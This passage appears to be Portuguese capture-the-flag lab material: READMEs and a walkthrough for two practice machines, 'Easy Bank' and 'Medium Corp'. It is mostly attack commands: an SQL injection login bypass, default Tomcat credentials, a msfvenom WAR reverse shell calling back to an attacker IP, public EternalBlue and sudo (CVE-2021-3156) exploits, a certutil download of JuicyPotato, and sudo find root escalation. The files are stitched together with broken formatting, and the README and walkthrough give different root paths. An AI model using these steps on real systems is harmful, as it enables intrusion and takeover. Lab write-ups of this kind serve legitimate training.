# 🏦 Easy Bank - Máquina Fácil

## Informações
- **Nome:** Easy Bank
- **Dificuldade:** Fácil
- **Pontos:** 20
- **OS:** Linux
- **IP:** 10.10.10.100

## 📌 Reconhecimento

### Nmap Scan
```bash
nmap -sC -sV -p- 10.10.10.100

Portas abertas:

22/tcp - SSH (OpenSSH 7.9)

80/tcp - HTTP (Apache 2.4.38)

443/tcp - HTTPS (Apache 2.4.38)

8080/tcp - HTTP (Tomcat 9.0.30)

--------------------------------------------------------------------------------------------

Web Enumeration

gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt
--------------------------------------------------------------------------------------------
Diretórios encontrados:

/admin

/backup

/images

/login

🔍 Vulnerabilidades
SQL Injection em /login
Payload: admin' OR '1'='1' --

Credenciais padrão no Tomcat
admin:admin

tomcat:tomcat

manager:manager

💻 Exploração
Acesso via Tomcat Manager
Acessar http://10.10.10.100:8080/manager

Login com tomcat:tomcat

Upload de WAR reverso
--------------------------------------------------------------------------------------------
Reverse Shell

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war

Upload e acesso: http://10.10.10.100:8080/shell/

🚀 Escalação de Privilégio

Enumeração

sudo -l
find / -perm -4000 2>/dev/null

--------------------------------------------------------------------------------------------
Vulnerabilidade: CVE-2021-3156 (sudo)

Exploit

git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./exploit
--------------------------------------------------------------------------------------------
Root obtido!

🏁 Flags
user.txt: flag{easy_bank_user}

root.txt: flag{easy_bank_root}

📝 Write-up

Link para walkthrough <== https://walkthroughs/easy-bank-walkthrough.md


### **challenges/hackthebox-style/machines/medium-corp/README.md**
```markdown
# 🏢 Medium Corp - Máquina Média

## Informações
- **Nome:** Medium Corp
- **Dificuldade:** Média
- **Pontos:** 30
- **OS:** Windows
- **IP:** 10.10.10.150

## 📌 Reconhecimento

### Nmap Scan
```bash
nmap -sC -sV -p- 10.10.10.150

Portas abertas:

135/tcp - RPC

139/tcp - NetBIOS

445/tcp - SMB

3389/tcp - RDP

8080/tcp - HTTP (IIS)
--------------------------------------------------------------------------------------------
SMB Enumeration

smbclient -L //10.10.10.150
smbmap -H 10.10.10.150
--------------------------------------------------------------------------------------------
Compartilhamentos:

Public (acesso anônimo)

Documents (requer senha)

Backup (requer senha)

🔍 Vulnerabilidades
EternalBlue (MS17-010)
O servidor é vulnerável ao EternalBlue.

Credenciais em arquivo de backup
No compartilhamento Public, encontramos:

backup_credentials.txt

💻 Exploração
--------------------------------------------------------------------------------------------
EternalBlue Exploit

git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010
python eternal_checker.py 10.10.10.150
python eternal_exploit7.py 10.10.10.150
--------------------------------------------------------------------------------------------
Acesso com credenciais

psexec.py WORKGROUP/user:'password'@10.10.10.150

--------------------------------------------------------------------------------------------
🚀 Escalação de Privilégio

JuicyPotato

certutil -urlcache -f http://10.10.14.5/JuicyPotato.exe JuicyPotato.exe
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *

--------------------------------------------------------------------------------------------

SYSTEM obtido!

🏁 Flags

user.txt: flag{medium_corp_user}

root.txt: flag{medium_corp_admin}

📝 Write-up

Link para walkthrough <== https://walkthroughs/medium-corp-walkthrough.md


## 📁 **challenges/hackthebox-style/walkthroughs/**

### **challenges/hackthebox-style/walkthroughs/easy-bank-walkthrough.md**
```markdown
# 🏦 Easy Bank - Walkthrough Completo

## Passo 1: Reconhecimento

### Escaneamento de Portas
```bash
nmap -sC -sV -p- 10.10.10.100 -oN nmap.txt

Resultado:

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9
80/tcp   open  http       Apache httpd 2.4.38
443/tcp  open  ssl/http   Apache httpd 2.4.38
8080/tcp open  http       Apache Tomcat 9.0.30

--------------------------------------------------------------------------------------------
Enumeração Web

gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt -o dirs.txt

/admin (Status: 200)
/backup (Status: 403)
/images (Status: 200)
/login (Status: 200)

--------------------------------------------------------------------------------------------
Passo 2: SQL Injection
Acessando http://10.10.10.100/login, encontramos um formulário de login.

Testando SQL Injection:

admin' OR '1'='1' --

Login bem-sucedido! Acessamos o painel admin.

Passo 3: Exploração do Tomcat
Verificando a porta 8080, encontramos o Tomcat Manager.

Credenciais padrão testadas:

tomcat:tomcat ✅

admin:admin ❌

manager:manager ❌

Acessamos o manager com tomcat:tomcat.

Gerando Payload

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war

Upload do arquivo shell.war e acesso:

curl http://10.10.10.100:8080/shell/

Reverse shell obtido!

--------------------------------------------------------------------------------------------
Passo 4: Pós-Exploração

Estabilizando o Shell

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
reset

Capturando user.txt

cd /home/tomcat
cat user.txt

Flag: flag{easy_bank_user}

--------------------------------------------------------------------------------------------
Passo 5: Escalação de Privilégio

Verificando vulnerabilidades:

sudo -l

Tomcat pode executar sudo em /usr/bin/find.

Exploit:

sudo find . -exec /bin/sh \;

Root obtido!

Capturando root.txt

cat /root/root.txt

Máquina Concluída!



--------------------------------------------------------------------------------------------




--------------------------------------------------------------------------------------------




--------------------------------------------------------------------------------------------
